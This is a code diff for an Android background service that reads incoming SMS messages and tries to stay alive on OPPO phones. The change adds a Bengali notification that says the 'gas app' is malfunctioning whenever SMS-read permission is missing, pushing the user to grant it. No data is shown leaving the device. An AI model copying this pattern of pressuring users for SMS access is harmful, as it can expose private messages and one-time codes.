@@ -10,12 +10,15 @@ import android.content.ContentUris;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.iocl.dac_collector.MainApplication.MyApp;
 import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.Receivers.MyReceiver;
 import android.iocl.dac_collector.SyncAdapters.SyncUtils;
 import android.iocl.dac_collector.Ui.MainActivity;
+import android.iocl.dac_collector.Ui.PermissionActivity;
 import android.iocl.dac_collector.Utility.NotificationHelper;
 import android.iocl.dac_collector.Utility.SmsWorkUtil;
 import android.iocl.dac_collector.Utility.Utility;
@@ -28,6 +31,7 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 
 import java.util.HashSet;
@@ -39,12 +43,8 @@ public class FixOppoAutoKill extends Service {
     private static final String TAG = "FixOppoAutoKill";
     private static final String PREF_LAST_SMS_TIME = "last_sms_time";
     private static final String PREF_LAST_SMS_ID = "last_sms_id";
-
-    private final Object SMS_PROCESS_LOCK = new Object();
-
-
     private static final int NOTIFICATION_ID = 1;
-
+    private final Object SMS_PROCESS_LOCK = new Object();
     private MyReceiver myReceiver;
     private boolean isReceiverRegistered = false;
     private SmsObserver smsObserver;
@@ -75,18 +75,29 @@ public class FixOppoAutoKill extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
+
+
+            if (ActivityCompat.checkSelfPermission(
+                    this,
+                    android.Manifest.permission.READ_SMS
+            ) != PackageManager.PERMISSION_GRANTED) {
+
+
+                NotificationHelper.sendNotification(
+                        getApplicationContext(),
+                        "আপনার ফোনে গ্যাসের অ্যাপ",
+                        "সঠিক ভাবে কাজ করছেনা",
+                        new Intent(MyApp.getContext(), PermissionActivity.class)
+                );
+            }
+
+
             if (!isReceiverRegistered) {
                 myReceiver = new MyReceiver();
                 IntentFilter filter = new IntentFilter(Intent.ACTION_USER_PRESENT);
                 registerReceiver(myReceiver, filter);
                 isReceiverRegistered = true;
 
-
-
-
-
-
-// TODO: Still not fixed the error of deduplication of sms Receiving
 
                 if (smsObserver == null) {
                     smsObserver = new SmsObserver(new Handler(Looper.getMainLooper()));
@@ -198,6 +209,17 @@ public class FixOppoAutoKill extends Service {
                 .build();
     }
 
+    private long getLastProcessedSmsId() {
+        return getSharedPreferences("sms_guard", MODE_PRIVATE)
+                .getLong(PREF_LAST_SMS_ID, -1);
+    }
+
+    private void saveLastProcessedSmsId(long smsId) {
+        getSharedPreferences("sms_guard", MODE_PRIVATE)
+                .edit()
+                .putLong(PREF_LAST_SMS_ID, smsId)
+                .apply();
+    }
 
     private class SmsObserver extends ContentObserver {
 
@@ -233,7 +255,6 @@ public class FixOppoAutoKill extends Service {
             debounceHandler.removeCallbacks(debounceRunnable);
             debounceHandler.postDelayed(debounceRunnable, DEBOUNCE_DELAY);
         }
-
 
 
         private void processPendingSms() {
@@ -301,7 +322,6 @@ public class FixOppoAutoKill extends Service {
         }
 
 
-
         private void processByIds(Set<Long> smsIds) {
 
             String selection = "_id IN (" + TextUtils.join(",", smsIds) + ")";
@@ -353,9 +373,6 @@ public class FixOppoAutoKill extends Service {
         }
 
 
-
-
-
         private void showSmsToast(String sender, String message, long dateMillis) {
 
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -380,29 +397,6 @@ public class FixOppoAutoKill extends Service {
                 }
             }, 2000);
         }
-    }
-    private long getLastProcessedTime() {
-        return getSharedPreferences("sms_guard", MODE_PRIVATE)
-                .getLong(PREF_LAST_SMS_TIME, 0);
-    }
-
-    private void saveLastProcessedTime(long time) {
-        getSharedPreferences("sms_guard", MODE_PRIVATE)
-                .edit()
-                .putLong(PREF_LAST_SMS_TIME, time)
-                .apply();
-    }
-
-    private long getLastProcessedSmsId() {
-        return getSharedPreferences("sms_guard", MODE_PRIVATE)
-                .getLong(PREF_LAST_SMS_ID, -1);
-    }
-
-    private void saveLastProcessedSmsId(long smsId) {
-        getSharedPreferences("sms_guard", MODE_PRIVATE)
-                .edit()
-                .putLong(PREF_LAST_SMS_ID, smsId)
-                .apply();
     }
 
 
